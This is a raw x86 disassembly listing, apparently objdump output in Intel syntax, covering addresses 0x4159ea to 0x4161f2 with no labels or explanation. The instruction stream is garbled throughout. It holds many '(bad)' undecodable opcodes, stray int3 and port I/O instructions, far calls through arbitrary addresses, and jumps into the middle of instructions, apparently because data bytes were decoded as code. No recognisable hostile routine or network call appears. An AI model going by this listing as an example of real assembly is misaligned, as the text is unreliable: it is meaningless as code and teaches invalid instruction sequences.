  4159ea:	mov    edi,edi
  4159ec:	xchg   DWORD PTR [eax],eax
  4159ee:	mov    DWORD PTR [edx-0x33ffef87],esp
  4159f4:	mov    cl,0x83
  4159f6:	call   DWORD PTR ds:0x89ffd041
  4159fc:	sti    
  4159fd:	add    bh,bh
  4159ff:	bound  eax,QWORD PTR [eax]
  415a01:	(bad)  
  415a02:	add    BYTE PTR [ecx+0x3cffff34],cl
  415a08:	mov    cl,0x81
  415a0a:	int3   
  415a0b:	add    BYTE PTR [edi+edi*8+0x6a2a5d89],bl
  415a12:	add    DWORD PTR [ebx-0xf000003],0x22
  415a19:	mov    ecx,0xfff1ff00
  415a1e:	dec    DWORD PTR [ecx]
  415a20:	cs or  eax,0x6400ff
  415a26:	add    BYTE PTR [ecx-0x7],bl
  415a29:	xchg   ebx,eax
  415a2a:	inc    DWORD PTR [eax]
  415a2c:	and    al,0xff
  415a2e:	add    cl,dl
  415a30:	cmp    eax,DWORD PTR [ebx-0x7d]
  415a33:	sbb    DWORD PTR [ebx],0xffffffff
  415a36:	xor    ecx,0xfffffff3
  415a39:	in     al,dx
  415a3a:	cmp    edi,0xffffffbc
  415a3d:	add    DWORD PTR [ebx-0x7f9126],0xffffffff
  415a44:	(bad)  
  415a45:	(bad)  
  415a46:	jmp    FWORD PTR [edx]
  415a48:	std    
  415a49:	int3   
  415a4a:	inc    DWORD PTR [eax]
  415a4c:	jbe    0x4159d7
  415a4e:	add    al,cl
  415a50:	ror    BYTE PTR [edx],cl
  415a52:	add    bh,bh
  415a54:	pop    ds
  415a55:	add    bh,bh
  415a57:	mov    ah,0x9e
  415a59:	or     al,0xff
  415a5b:	call   ebp
  415a5d:	add    bh,bh
  415a5f:	cmc    
  415a60:	adc    al,0x64
  415a62:	dec    DWORD PTR [ecx+0x7083833d]
  415a68:	sbb    eax,0x9f00ccb7
  415a6d:	inc    DWORD PTR [eax]
  415a6f:	add    ah,cl
  415a71:	mov    al,ds:0x831cffff
  415a76:	(bad)  
  415a77:	jns    0x415ace
  415a79:	(bad)  
  415a7a:	int3   
  415a7b:	and    DWORD PTR [ecx],0xffffff83
  415a7e:	call   DWORD PTR [eax]
  415a80:	adc    eax,0xf1ff007b
  415a85:	add    BYTE PTR [eax],al
  415a87:	fild   QWORD PTR [ebx+ebp*1-0x690100]
  415a8e:	xor    ebx,0xffffffcb
  415a91:	and    edi,edi
  415a93:	mov    DWORD PTR [edx+0x21568989],ebp
  415a99:	adc    al,BYTE PTR [ebx+0xff3100]
  415a9f:	pop    esp
  415aa0:	jmp    0xffcc:0x24cc8962
  415aa7:	std    
  415aa8:	fdiv   st,st(6)
  415aaa:	add    BYTE PTR [eax],al
  415aac:	mov    al,BYTE PTR [eax]
  415aae:	add    BYTE PTR [ecx+esi*4],cl
  415ab1:	xor    DWORD PTR [eax],eax
  415ab3:	call   DWORD PTR [ebx+0x4994ff00]
  415ab9:	inc    DWORD PTR gs:[eax]
  415abc:	outs   dx,BYTE PTR ds:[esi]
  415abd:	inc    DWORD PTR [eax]
  415abf:	push   ds
  415ac0:	adc    eax,0xc4ffff92
  415ac5:	inc    DWORD PTR [eax]
  415ac7:	lds    ecx,FWORD PTR [ebp+0x5700832d]
  415acd:	inc    DWORD PTR [eax]
  415acf:	sub    eax,0xff8399fc
  415ad4:	sbb    al,0x0
  415ad6:	mov    DWORD PTR [ecx],edi
  415ad8:	arpl   WORD PTR [edi+0x29ff00],cx
  415ade:	(bad)  
  415adf:	(bad)  
  415ae1:	test   al,0x89
  415ae3:	or     DWORD PTR [ebx],0x0
  415ae6:	adc    DWORD PTR [esi-0x7c006560],0xffffffd8
  415aed:	add    bh,bh
  415aef:	aaa    
  415af0:	cwde   
  415af1:	jo     0x415af3
  415af3:	call   FWORD PTR [ebx-0x744b7c34]
  415af9:	jge    0x415a7e
  415afb:	int3   
  415afc:	cdq    
  415afd:	add    BYTE PTR [eax],al
  415aff:	jb     0x415ad1
  415b01:	xlat   BYTE PTR ds:[ebx]
  415b02:	add    BYTE PTR [eax],al
  415b04:	inc    ecx
  415b05:	int3   
  415b06:	call   DWORD PTR [eax]
  415b08:	ss push ebp
  415b0a:	add    BYTE PTR [eax],al
  415b0c:	add    BYTE PTR [eax],0xff
  415b0f:	inc    ebx
  415b10:	das    
  415b11:	(bad)  
  415b12:	(bad)  
  415b13:	(bad)  
  415b14:	jns    0x415b16
  415b16:	int3   
  415b17:	lea    esp,[ecx+eiz*1-0x76e7ff7d]
  415b1e:	(bad)  
  415b1f:	sti    
  415b20:	sub    cl,dl
  415b22:	inc    DWORD PTR [ebx-0x1c767cb7]
  415b28:	push   cs
  415b29:	adc    cl,ah
  415b2b:	dec    DWORD PTR [edi-0x1]
  415b2e:	add    ah,ah
  415b30:	js     0x415b41
  415b32:	mov    DWORD PTR [eax],eax
  415b34:	dec    edi
  415b35:	(bad)  
  415b36:	dec    DWORD PTR [ecx-0xd47a]
  415b3c:	dec    esp
  415b3d:	int3   
  415b3e:	jmp    DWORD PTR [ebx]
  415b40:	test   eax,0xb0ff009b
  415b45:	(bad)  
  415b46:	push   DWORD PTR [edx+0x43]
  415b49:	pop    esi
  415b4a:	(bad)  
  415b4b:	call   ebx
  415b4d:	cmp    edi,0xfffffff9
  415b50:	sbb    al,0x3b
  415b52:	add    BYTE PTR [ebx+0x6aff83af],al
  415b58:	ja     0x415b74
  415b5a:	add    bh,bh
  415b5c:	push   esp
  415b5d:	add    DWORD PTR [ebx-0x6e8a44],0xffffffff
  415b64:	out    dx,al
  415b65:	add    bh,bh
  415b67:	xchg   ebx,eax
  415b68:	lock xchg esp,eax
  415b6a:	inc    DWORD PTR [ebx+0x2700ffa1]
  415b70:	adc    ah,BYTE PTR [edi+0xc0ff89]
  415b76:	add    BYTE PTR [edi-0x7c48ae],al
  415b7c:	lds    eax,FWORD PTR [eax]
  415b7e:	int3   
  415b7f:	sbb    dh,BYTE PTR [ebx]
  415b81:	jle    0x415b82
  415b83:	push   DWORD PTR [eax-0x1]
  415b86:	mov    DWORD PTR ds:0xcccc0d26,ebp
  415b8c:	mov    bh,0x0
  415b8e:	jmp    DWORD PTR [eax+0x5d23]
  415b94:	daa    
  415b95:	add    BYTE PTR [eax],al
  415b97:	xor    al,0x72
  415b99:	fild   WORD PTR [eax]
  415b9b:	add    bl,ch
  415b9d:	int3   
  415b9e:	cmp    DWORD PTR [edx],0xffffffec
  415ba1:	or     bh,bh
  415ba3:	add    BYTE PTR [eax+eax*1-0x1],al
  415ba7:	add    eax,DWORD PTR [edi-0x48]
  415baa:	add    BYTE PTR [eax],al
  415bac:	js     0x415bad
  415bae:	(bad)  
  415baf:	in     al,dx
  415bb0:	dec    edx
  415bb1:	rol    BYTE PTR [eax],cl
  415bb3:	mov    ebp,edx
  415bb5:	(bad)  
  415bb6:	call   DWORD PTR ds:0xff006df4
  415bbc:	fild   WORD PTR [eax]
  415bbe:	inc    DWORD PTR [esi+eax*4+0x4cff8988]
  415bc5:	(bad)  
  415bc6:	(bad)  
  415bc7:	stc    
  415bc8:	icebp  
  415bc9:	push   0xcc2b0000
  415bce:	adc    DWORD PTR [ebx],0xffffffb2
  415bd1:	sbb    edi,edi
  415bd3:	(bad)  
  415bd4:	mov    eax,0x20fcffff
  415bd9:	or     ah,0xff
  415bdc:	fld    DWORD PTR [eax]
  415bde:	jmp    DWORD PTR [ebx+0x6e]
  415be1:	inc    esp
  415be2:	inc    DWORD PTR [eax]
  415be4:	mov    ebx,0xe5328300
  415be9:	out    0x0,al
  415beb:	add    BYTE PTR [edx-0x34],cl
  415bee:	or     DWORD PTR [eax+0x2e],0xffffffb3
  415bf2:	(bad)  
  415bf3:	push   DWORD PTR [eax+eax*1]
  415bf6:	dec    esp
  415bf8:	dec    esp
  415bf9:	lock add DWORD PTR [eax],0x5
  415bfd:	(bad)  
  415bfe:	push   DWORD PTR [edx+0x50]
  415c01:	test   DWORD PTR [eax],0x2eff
  415c07:	mov    edx,0xccbf3f
  415c0c:	inc    DWORD PTR es:[eax]
  415c0f:	mov    edi,0xfff75c
  415c14:	inc    ecx
  415c15:	add    DWORD PTR [ebx-0x31e5dd],0xffffff89
  415c1c:	xchg   esp,eax
  415c1d:	(bad)  
  415c1e:	(bad)  
  415c1f:	mov    ecx,0x830377
  415c24:	inc    DWORD PTR [bx+si]
  415c27:	enter  0x3dda,0x0
  415c2b:	push   DWORD PTR [edx]
  415c2d:	add    BYTE PTR [ebx+0x6bb93],al
  415c33:	cmp    DWORD PTR [ebp-0x7d],0xffffffff
  415c37:	mov    ch,0x99
  415c39:	stc    
  415c3a:	dec    esp
  415c3c:	(bad)  
  415c3d:	(bad)  
  415c3e:	call   FWORD PTR [ecx-0xd5fd]
  415c44:	push   edi
  415c45:	inc    DWORD PTR [eax]
  415c47:	ins    BYTE PTR es:[edi],dx
  415c48:	sub    BYTE PTR [ecx],ch
  415c4a:	add    bh,bh
  415c4c:	jge    0x415c4e
  415c4e:	add    al,ah
  415c50:	lahf   
  415c51:	mov    es,WORD PTR [eax]
  415c53:	sbb    DWORD PTR [esi],0xffffffff
  415c56:	dec    DWORD PTR [ecx]
  415c58:	mov    cl,0xc5
  415c5a:	add    DWORD PTR [eax],0x76
  415c5d:	inc    DWORD PTR [eax]
  415c5f:	xor    eax,0x83bfd5
  415c64:	and    BYTE PTR [eax],al
  415c66:	call   DWORD PTR [edx]
  415c68:	sub    BYTE PTR [ecx-0x1],bl
  415c6b:	push   DWORD PTR [ecx-0x246e3400]
  415c71:	scas   al,BYTE PTR es:[edi]
  415c72:	dec    esp
  415c74:	(bad)  
  415c75:	dec    esp
  415c77:	inc    esi
  415c78:	lds    esp,FWORD PTR [edx+0x52ff00]
  415c7e:	sbb    DWORD PTR [esi+0xff8787],0x3
  415c85:	inc    DWORD PTR [eax]
  415c87:	push   0xff008f5e
  415c8c:	mov    al,BYTE PTR [ebx-0x2e662700]
  415c92:	inc    DWORD PTR [eax]
  415c94:	mov    ecx,0x5b16ffff
  415c99:	ins    BYTE PTR es:[edi],dx
  415c9a:	cmp    edi,0xffffff95
  415c9d:	mov    edi,edi
  415c9f:	sub    BYTE PTR [ebp+0x17ffff19],0xff
  415ca6:	(bad)  
  415ca7:	jl     0x415c8a
  415ca9:	ror    esp,1
  415cab:	int3   
  415cac:	out    0xff,eax
  415cae:	xor    eax,0x5a
  415cb1:	mov    edi,?
  415cb3:	add    BYTE PTR [ecx-0x1],ch
  415cb6:	push   edi
  415cb8:	pop    esp
  415cb9:	pop    edi
  415cba:	mov    edi,edi
  415cbc:	popf   
  415cbd:	add    BYTE PTR [eax],al
  415cbf:	or     dh,dl
  415cc1:	push   0x0
  415cc3:	add    dh,ch
  415cc5:	or     DWORD PTR [ecx-0x7c8616e5],0x0
  415ccc:	cmp    eax,0x85c38989
  415cd1:	mov    al,BYTE PTR [eax]
  415cd3:	and    ebp,0x0
  415cd6:	add    BYTE PTR [ebx],dl
  415cd8:	(bad)  
  415cd9:	adc    eax,0xd80083
  415cde:	add    BYTE PTR [esi],dl
  415ce0:	inc    edx
  415ce1:	jp     0x415ce2
  415ce3:	int3   
  415ce4:	test   DWORD PTR [eax],eax
  415ce6:	add    BYTE PTR [esi],ch
  415ce8:	pop    ecx
  415ce9:	sar    bh,cl
  415ceb:	call   FWORD PTR [esi]
  415ced:	add    BYTE PTR [eax],al
  415cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf0:	mov    BYTE PTR [edx-0x7d],bl
  415cf3:	(bad)  
  415cf4:	mov    esi,0x72bf8983
  415cf9:	xor    al,0x0
  415cfb:	inc    DWORD PTR [esi]
  415cfd:	(bad)  
  415cfe:	inc    DWORD PTR [esi-0x53]
  415d01:	in     eax,dx
  415d02:	(bad)  
  415d03:	jmp    esi
  415d05:	mov    DWORD PTR [eax],eax
  415d07:	sub    ebp,DWORD PTR [edx*8-0x76eb0001]
  415d0e:	add    dl,al
  415d10:	call   FWORD PTR [ebx-0x1]
  415d13:	call   eax
  415d15:	add    DWORD PTR [ebx-0xddbb78],0xffffffcc
  415d1c:	dec    esi
  415d1d:	(bad)  
  415d1e:	inc    DWORD PTR [esi-0x3e]
  415d21:	jmp    0xffff5d25
  415d26:	adc    DWORD PTR [ebp+0x3c],0xfffffff2
  415d2a:	add    BYTE PTR [eax],al
  415d2c:	xor    edi,edi
  415d2e:	add    BYTE PTR [ecx+0x39],bh
  415d31:	retf   0x8389
  415d34:	pusha  
  415d35:	cmp    edi,0xc
  415d38:	sbb    al,0xa1
  415d3a:	add    bh,bh
  415d3c:	in     al,0xff
  415d3e:	call   DWORD PTR [ebx]
  415d40:	imul   ecx,DWORD PTR [ebx-0x1],0xffffffff
  415d44:	sub    al,BYTE PTR [eax]
  415d46:	(bad)  
  415d47:	fldl2e 
  415d49:	leave  
  415d4a:	add    BYTE PTR [eax],al
  415d4c:	dec    esp
  415d4d:	cmp    edi,0xffffffa9
  415d50:	jae    0x415d13
  415d52:	add    BYTE PTR [ebx+0x26ff0003],al
  415d58:	add    eax,0x5a8383b7
  415d5d:	inc    DWORD PTR [eax]
  415d5f:	ins    DWORD PTR es:[edi],dx
  415d60:	jge    0x415d61
  415d62:	inc    DWORD PTR [eax]
  415d64:	or     eax,0x7037ffce
  415d69:	mov    edi,edi
  415d6b:	dec    DWORD PTR [ecx+0x6b]
  415d6e:	call   FWORD PTR [edi-0x4c]
  415d71:	int3   
  415d72:	inc    DWORD PTR [eax]
  415d74:	ss push edi
  415d76:	add    BYTE PTR [ebx],ch
  415d78:	dec    ebx
  415d79:	(bad)  
  415d7a:	inc    DWORD PTR [eax]
  415d7c:	mov    DWORD PTR [edi+edi*8],0xcca2ce
  415d83:	mov    DWORD PTR [esi],ecx
  415d85:	cmp    al,0x0
  415d87:	call   0x140e74c
  415d8c:	adc    eax,0x345affb6
  415d91:	mov    DWORD PTR [eax],eax
  415d93:	jmp    FWORD PTR [edi-0x5f]
  415d96:	int3   
  415d97:	fwait
  415d98:	hlt    
  415d99:	(bad)  
  415d9a:	dec    esp
  415d9c:	lock mov ds:0xff471600,eax
  415da2:	inc    DWORD PTR [eax]
  415da4:	mov    edx,edx
  415da6:	dec    esi
  415da8:	stos   BYTE PTR es:[edi],al
  415da9:	add    ah,cl
  415dab:	(bad)  
  415dac:	in     eax,dx
  415dad:	inc    edx
  415dae:	call   DWORD PTR [ebx+edi*4-0x1]
  415db2:	mov    DWORD PTR [ebx-0x757ca8d7],eax
  415db8:	hlt    
  415db9:	inc    DWORD PTR [ebx-0xf8d601]
  415dbf:	mov    esi,0xcc89ffd7
  415dc4:	mov    ebp,0xce9eff03
  415dc9:	add    BYTE PTR [ecx-0x33adaa00],cl
  415dcf:	cmp    al,0x86
  415dd1:	or     DWORD PTR [ecx-0x569700],0x61
  415dd8:	ds cmp edi,0xffffffff
  415ddc:	scas   al,BYTE PTR es:[edi]
  415ddd:	jl     0x415ddf
  415ddf:	cs fwait
  415de1:	inc    DWORD PTR [eax]
  415de3:	int3   
  415de4:	pop    esi
  415de5:	cld    
  415de6:	push   eax
  415de8:	adc    al,0x0
  415dea:	add    BYTE PTR [eax],al
  415dec:	mov    cl,BYTE PTR [edx-0x293534]
  415df2:	add    DWORD PTR [eax],0xfffffff0
  415df5:	push   edx
  415df6:	add    BYTE PTR [edi-0x71],dl
  415df9:	dec    esp
  415dfb:	mov    DWORD PTR [eax-0x5],esi
  415dfe:	call   DWORD PTR [esi+0xffffc5]
  415e04:	loope  0x415db4
  415e06:	add    ah,dh
  415e08:	xchg   edx,eax
  415e09:	(bad)  
  415e0a:	inc    DWORD PTR [ebx+0x78892889]
  415e10:	ds cmp edi,0xffffffff
  415e14:	scas   al,BYTE PTR es:[edi]
  415e15:	xchg   esi,eax
  415e16:	mov    DWORD PTR [edi-0xffc9],esp
  415e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e1d:	push   0xffffffff
  415e1f:	xor    eax,0xccff0017
  415e24:	mov    eax,0x8f38ff19
  415e29:	add    bh,bh
  415e2b:	push   DWORD PTR [edi]
  415e2d:	push   edx
  415e2e:	add    BYTE PTR [edi+edx*2+0x1f83ffff],bl
  415e35:	int3   
  415e36:	call   FWORD PTR [ebx+ebp*4-0x32ff7c01]
  415e3d:	in     al,0x89
  415e3f:	out    dx,eax
  415e40:	cdq    
  415e41:	(bad)  
  415e42:	inc    DWORD PTR [eax]
  415e44:	and    BYTE PTR [edx],0xff
  415e47:	hlt    
  415e48:	in     al,0x0
  415e4a:	inc    DWORD PTR [ebx-0x3000ea70]
  415e50:	cmc    
  415e51:	(bad)  
  415e52:	(bad)  
  415e53:	call   FWORD PTR [ecx+eiz*4-0x33d6cc00]
  415e5a:	mov    edi,edi
  415e5c:	(bad)  
  415e5e:	mov    DWORD PTR [edx+0x4c],edx
  415e61:	inc    DWORD PTR [eax]
  415e63:	mov    DWORD PTR [eax+0x77f0079],eax
  415e69:	add    BYTE PTR [eax],al
  415e6b:	jmp    ecx
  415e6d:	data16 add BYTE PTR [ebx],dl
  415e70:	ins    BYTE PTR es:[edi],dx
  415e71:	inc    DWORD PTR [ebx-0x33abed00]
  415e77:	push   ss
  415e78:	inc    ebp
  415e79:	(bad)  
  415e7a:	(bad)  
  415e7b:	(bad)  
  415e7c:	cmp    al,0xdf
  415e7e:	inc    DWORD PTR [eax+edx*4-0x77]
  415e82:	int3   
  415e83:	call   FWORD PTR [edi]
  415e85:	(bad)  
  415e86:	push   DWORD PTR [eax-0x7cff761a]
  415e8c:	data16 test BYTE PTR [eax],al
  415e8f:	xchg   edi,eax
  415e90:	les    eax,FWORD PTR [eax]
  415e92:	(bad)  
  415e93:	(bad)  
  415e94:	fiadd  WORD PTR [edi+0xb530ff]
  415e9a:	(bad)  
  415e9b:	call   FWORD PTR [edx+0x5d57ffd0]
  415ea1:	add    DWORD PTR [eax],0xffffffcc
  415ea4:	loop   0x415efd
  415ea6:	add    BYTE PTR [esi-0x31],bh
  415ea9:	(bad)  
  415eaa:	dec    esp
  415eac:	fiadd  DWORD PTR [ebp+0x191800]
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	das    
  415eb5:	fld    DWORD PTR [ebx-0x3333d14a]
  415ebb:	and    ebp,0x6e
  415ebe:	add    BYTE PTR [eax-0x51],ch
  415ec1:	add    bh,bh
  415ec3:	dec    DWORD PTR [edx-0x76217cba]
  415ec9:	(bad)  
  415eca:	dec    DWORD PTR [ecx+0x2189ad96]
  415ed0:	pop    es
  415ed1:	cmp    edi,0xffffffff
  415ed4:	ins    BYTE PTR es:[edi],dx
  415ed5:	mov    edi,?
  415ed7:	pop    ebx
  415ed8:	cmp    edi,0xffffffff
  415edb:	jmp    FWORD PTR [esi-0x35]
  415ede:	mov    esp,edi
  415ee0:	inc    ecx
  415ee1:	add    DWORD PTR [ebx-0xf8df34],0xffffff9f
  415ee8:	push   ds
  415ee9:	inc    DWORD PTR [ebx-0x7cfca001]
  415eef:	sub    al,0x7b
  415ef1:	add    BYTE PTR [ebx-0xcacd01],al
  415ef7:	inc    esi
  415ef8:	inc    esi
  415ef9:	add    bh,bh
  415efb:	call   FWORD PTR [edx+0x106c8392]
  415f01:	(bad)  
  415f02:	inc    DWORD PTR [eax]
  415f04:	mov    dl,0xc0
  415f06:	add    BYTE PTR [edx-0xff6d],ah
  415f0c:	cmp    al,0x6
  415f0e:	add    BYTE PTR [edi-0x7c0071],cl
  415f14:	jg     0x415eb6
  415f16:	push   esp
  415f18:	mov    eax,0x86ffffff
  415f1d:	mov    edx,0xfff570ff
  415f22:	add    bh,bh
  415f24:	jnp    0x415eff
  415f26:	dec    ecx
  415f28:	mov    cs,esp
  415f2a:	(bad)  
  415f2b:	(bad)  
  415f2c:	mov    esi,0xdee6ff95
  415f31:	(bad)  
  415f32:	(bad)  
  415f33:	dec    DWORD PTR [edi-0x36]
  415f36:	sub    DWORD PTR [edi-0x69],0xffffffff
  415f3a:	(bad)  
  415f3b:	(bad)  
  415f3c:	mov    esi,0xea33ff53
  415f41:	inc    DWORD PTR [eax]
  415f43:	call   DWORD PTR ds:0x3a6ffffd
  415f49:	(bad)  
  415f4a:	inc    DWORD PTR [eax]
  415f4c:	jb     0x415f3d
  415f4e:	or     DWORD PTR [ebp-0x99],0xffffffae
  415f55:	stc    
  415f56:	jmp    FWORD PTR [ebx+0x42]
  415f59:	dec    DWORD PTR [ecx-0x7c367d]
  415f5f:	and    al,0x9c
  415f61:	inc    DWORD PTR [eax]
  415f63:	add    ch,dl
  415f65:	xchg   BYTE PTR [eax],al
  415f67:	xchg   ebx,eax
  415f68:	inc    edx
  415f69:	add    BYTE PTR [eax],al
  415f6b:	int3   
  415f6c:	sub    esi,esi
  415f6e:	jmp    DWORD PTR [ebx]
  415f70:	int    0x0
  415f72:	add    bh,bh
  415f74:	pop    ebx
  415f75:	jae    0x415f77
  415f77:	mov    edi,0xffff007f
  415f7c:	mov    cl,0xa2
  415f7e:	inc    edi
  415f80:	adc    eax,DWORD PTR [eax]
  415f82:	inc    DWORD PTR [eax]
  415f84:	mov    cl,0x2d
  415f86:	dec    DWORD PTR [edi+0x1e]
  415f89:	add    BYTE PTR [eax],al
  415f8b:	add    cl,bh
  415f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8e:	int3   
  415f8f:	push   cs
  415f90:	jb     0x415f92
  415f92:	(bad)  
  415f93:	jmp    DWORD PTR [eax]
  415f95:	int    0x0
  415f97:	add    BYTE PTR [edi+edi*8],dh
  415f9a:	cmp    edi,0xffffff96
  415f9d:	(bad)  
  415f9e:	dec    DWORD PTR [ecx]
  415fa0:	test   eax,0x45ffffff
  415fa5:	in     eax,0xff
  415fa7:	sub    eax,0xff8300de
  415fac:	not    DWORD PTR [ecx-0x7c53dd77]
  415fb2:	add    BYTE PTR [ebx+0x54fff3e2],al
  415fb8:	icebp  
  415fb9:	inc    DWORD PTR [ebx-0xa87d01]
  415fbf:	add    bh,BYTE PTR [ebx+0x0]
  415fc2:	int3   
  415fc3:	call   DWORD PTR [eax-0xdf2ff1c]
  415fc9:	int3   
  415fca:	add    BYTE PTR [ebx-0x477c4f5a],al
  415fd0:	mov    edx,0x23ffff00
  415fd5:	push   0xffddc8ff
  415fda:	int3   
  415fdb:	jmp    DWORD PTR [ebp+0x227fff34]
  415fe1:	inc    DWORD PTR [eax]
  415fe3:	mov    DWORD PTR [esi],edi
  415fe5:	xchg   BYTE PTR [ebx-0xff6f94],al
  415feb:	int3   
  415fec:	sets   bh
  415fef:	mov    al,ds:0xffff899c
  415ff4:	pop    ebx
  415ff5:	xchg   ebx,eax
  415ff6:	jmp    DWORD PTR [ecx]
  415ff8:	cmp    al,BYTE PTR [eax]
  415ffa:	dec    DWORD PTR [ecx-0x730093b1]
  416000:	or     al,0x83
  416002:	cmp    edi,0xffffffc9
  416005:	sub    edi,edi
  416007:	int    0x27
  416009:	add    DWORD PTR [eax],0xffffffff
  41600c:	mov    ah,0x3
  41600e:	add    BYTE PTR [ebp+0x8330],bh
  416014:	and    ebx,eax
  416016:	int3   
  416017:	dec    edi
  416018:	pop    esp
  416019:	or     esp,0xffffffff
  41601c:	lahf   
  41601d:	xchg   ah,cl
  41601f:	or     al,0x34
  416021:	add    BYTE PTR [eax],al
  416023:	int3   
  416024:	add    DWORD PTR [edi+edi*8],0x4a
  416028:	or     BYTE PTR [ebx+0x603bcc83],al
  41602e:	(bad)  
  41602f:	mov    edi,0x8900ffb8
  416034:	ins    DWORD PTR es:[edi],dx
  416035:	jns    0x415fc0
  416037:	int    0x18
  416039:	inc    DWORD PTR [eax]
  41603b:	int3   
  41603c:	sbb    al,0x10
  41603e:	mov    DWORD PTR [ecx-0x5],edx
  416041:	inc    DWORD PTR [eax]
  416043:	add    BYTE PTR [edi-0x1d8100b2],ah
  416049:	dec    esp
  41604b:	add    bh,al
  41604d:	sar    bh,0x65
  416050:	ret    
  416051:	inc    DWORD PTR [eax]
  416053:	add    ah,al
  416055:	add    BYTE PTR [ebx-0x7c7682b9],al
  41605b:	(bad)  
  41605c:	mov    esp,0x302d0048
  416061:	dec    esp
  416063:	add    BYTE PTR [ecx+0x6003ff9f],bl
  416069:	inc    DWORD PTR [ebx-0xcdc501]
  41606f:	adc    BYTE PTR [eax-0x77],0xff
  416073:	dec    DWORD PTR ds:0x36deff36
  416079:	add    BYTE PTR [eax],al
  41607b:	dec    esi
  41607d:	fisttp WORD PTR [ecx+0xffc310]
  416083:	call   eax
  416085:	call   DWORD PTR fs:[eax+0x14]
  416089:	add    BYTE PTR [eax],al
  41608b:	mov    esi,esp
  41608d:	in     al,0xff
  41608f:	shl    BYTE PTR [esi+0x1dff0089],cl
  416095:	fcmove st,st(4)
  416097:	push   eax
  416098:	ins    DWORD PTR es:[edi],dx
  416099:	inc    DWORD PTR [eax]
  41609b:	inc    edx
  41609d:	iret   
  41609e:	add    BYTE PTR [ebx+0x83ffbb],ch
  4160a4:	in     al,dx
  4160a5:	or     al,0xff
  4160a7:	sbb    bh,BYTE PTR [ebp-0x54007601]
  4160ad:	int    0xff
  4160af:	add    al,0x8a
  4160b1:	(bad)  
  4160b2:	(bad)  
  4160b3:	call   FWORD PTR [ecx]
  4160b5:	pop    ebx
  4160b6:	add    BYTE PTR [edx-0x7cffffae],ah
  4160bc:	or     al,BYTE PTR [eax+0x4663ff]
  4160c2:	(bad)  
  4160c3:	(bad)  
  4160c4:	cmp    eax,0xb82a83b5
  4160c9:	int3   
  4160ca:	(bad)  
  4160cb:	inc    edx
  4160cd:	add    DWORD PTR [ebx-0x1e85],0xffffffff
  4160d4:	cmp    al,BYTE PTR [edx-0xf0e701]
  4160da:	inc    DWORD PTR [eax]
  4160dc:	mov    eax,ds:0xa147ff56
  4160e1:	add    bh,bh
  4160e3:	add    BYTE PTR [edi],al
  4160e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e6:	jmp    FWORD PTR [ebx+0xc]
  4160e9:	add    BYTE PTR [eax],al
  4160eb:	add    bh,bh
  4160ed:	jg     0x4160ee
  4160ef:	loop   0x4160f9
  4160f1:	add    BYTE PTR [ecx-0x9de97d],cl
  4160f7:	dec    ebx
  4160f8:	retf   
  4160f9:	(bad)  
  4160fa:	inc    DWORD PTR [eax]
  4160fc:	mov    esp,DWORD PTR [edi-0xa62701]
  416102:	inc    DWORD PTR [ebx+0x6efff5ba]
  416108:	pop    esi
  416109:	add    BYTE PTR [eax],al
  41610b:	add    BYTE PTR [esi+0x33],cl
  41610e:	or     DWORD PTR [eax],0xffffffac
  416111:	add    BYTE PTR [ebx+0x3c0283],al
  416117:	push   ss
  416118:	(bad)  
  416119:	inc    DWORD PTR [eax]
  41611b:	inc    DWORD PTR [edi]
  41611d:	adc    BYTE PTR [eax],al
  41611f:	xchg   esp,eax
  416120:	sbb    bh,bh
  416122:	cmp    edi,0x11
  416125:	xchg   ecx,eax
  416126:	add    BYTE PTR [ebx-0xff336c],bh
  41612c:	adc    eax,0xf721ff91
  416131:	inc    DWORD PTR [ebx-0x5cc600]
  416137:	pop    esi
  416138:	aam    0xcc
  41613a:	mov    edi,edi
  41613c:	xchg   ebp,eax
  41613d:	mov    al,0x0
  41613f:	dec    edx
  416140:	mov    ebx,0x11ffff00
  416145:	(bad)
  416148:	sbb    BYTE PTR [ebx-0x2f0aff7d],al
  41614e:	adc    DWORD PTR [eax-0x7c007c7c],0xffffffda
  416155:	mov    ecx,0xff2d5eff
  41615a:	inc    DWORD PTR [eax]
  41615c:	xor    eax,0x46b00036
  416161:	add    BYTE PTR [eax],al
  416163:	add    BYTE PTR [ebp+0x79],al
  416166:	dec    DWORD PTR [esi]
  416168:	in     eax,dx
  416169:	(bad)  
  41616a:	dec    esp
  41616c:	xchg   ah,dl
  41616e:	call   DWORD PTR [eax-0x38]
  416171:	int3   
  416172:	cmp    edi,0xffffffc0
  416175:	push   0xffffffff
  416177:	sub    eax,0xff0089ff
  41617c:	mov    dh,0x9b
  41617e:	int3   
  41617f:	mov    ebx,DWORD PTR [eax]
  416181:	inc    DWORD PTR [eax]
  416183:	push   edx
  416185:	cmp    eax,0xffba46ff
  41618a:	add    bh,bh
  41618c:	(bad)  
  41618e:	add    BYTE PTR [esi],ch
  416190:	dec    edx
  416191:	add    BYTE PTR [ecx-0x7cfe4800],cl
  416197:	repnz outs dx,DWORD PTR ds:[esi]
  416199:	add    DWORD PTR [eax],0xffffffff
  41619c:	xchg   edx,eax
  41619d:	sbb    eax,0x8944dcff
  4161a2:	int3   
  4161a3:	add    DWORD PTR [esi+0xe7083a7],0xffffffcc
  4161aa:	inc    DWORD PTR [ebx-0x1a008886]
  4161b0:	cmp    al,BYTE PTR [eax]
  4161b2:	cmp    edi,0xffffffd2
  4161b5:	xchg   edi,eax
  4161b6:	int3   
  4161b7:	pop    es
  4161b8:	dec    edi
  4161b9:	add    bh,bh
  4161bb:	int3   
  4161bc:	loope  0x4161c2
  4161be:	push   DWORD PTR [eax-0x59]
  4161c1:	dec    DWORD PTR [ecx-0x4ba47d]
  4161c7:	adc    ebp,DWORD PTR [edi]
  4161c9:	mov    DWORD PTR [eax],eax
  4161cb:	add    dl,dl
  4161cd:	mov    esp,0xff323bff
  4161d2:	add    DWORD PTR [ebx+0x6783ba45],0xffffff86
  4161d9:	int3   
  4161da:	(bad)  
  4161db:	(bad)  
  4161dc:	aas    
  4161dd:	ror    esp,1
  4161df:	sub    edi,DWORD PTR [eax-0x1]
  4161e2:	inc    DWORD PTR [eax]
  4161e4:	div    DWORD PTR [eax+eax*1+0x10]
  4161e8:	imul   eax,DWORD PTR [eax],0x3760ff00
  4161ee:	mov    eax,ebp
  4161f0:	test   esp,ecx
  4161f2:	add    BYTE PTR [ebx+0x38839299],al
